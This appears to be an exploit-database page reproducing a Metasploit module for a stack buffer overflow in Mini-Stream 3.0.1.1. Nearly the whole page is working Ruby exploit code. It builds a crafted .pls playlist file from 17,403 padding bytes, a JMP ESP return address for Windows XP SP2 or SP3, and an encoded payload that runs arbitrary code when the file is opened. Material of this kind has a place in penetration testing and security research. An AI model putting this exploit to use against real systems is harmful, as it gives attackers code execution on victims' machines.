Mini-Stream 3.0.1.1 Buffer Overflow Exploit (Meta)
==================================================


# Title: Mini-Stream 3.0.1.1 Buffer Overflow Exploit (Meta)
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Ron Henry and dijital1
# Published: 2009-12-27
# Verified: yes

view source
print?
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Mini-Stream 3.0.1.1 Buffer Overflow Exploit',
            'Description' => %q{    
                This module exploits a stack overflow in Mini-Stream 3.0.1.1
            By creating a specially crafted pls file, an an attacker may be able
            to execute arbitrary code.
            },
            'License' => MSF_LICENSE,
            'Author' =>
                [
                    'Corlan Security Team ',
                    'Ron Henry - <rlh [at] ciphermonk.net> - EIP Offset fix',
                    'dijital1',
                ],
            'Version' => '$Revision: 7828 $',
            'References' =>
                [
                    [ 'OSVDB', '' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/10745' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },
            'Payload' =>
                {
                    'Space' => 3500,
                    'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x26\x3d\x2b\x3f\x3a\x3b\x2d\x2c\x2f\x23\x2e\x5c\x30",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP SP3 - English', { 'Ret' => 0x7e429353} ],      # 0x7e429353 JMP ESP - USER32.dll
                    [ 'Windows XP SP2 - English', { 'Ret' => 0x7c941eed} ],      # 0x7c941eed JMP ESP - SHELL32.dll
                ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'metasploit.pls']),
            ], self.class)
    end
 
 
    def exploit
 
        sploit = rand_text_alphanumeric(17403)
        sploit << [target.ret].pack('V')
        sploit << "CAFE" * 8
        sploit << payload.encoded
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(sploit)
      print_status("Copy .pls to webserver and pass the URL to the application")
 
    end
 
end



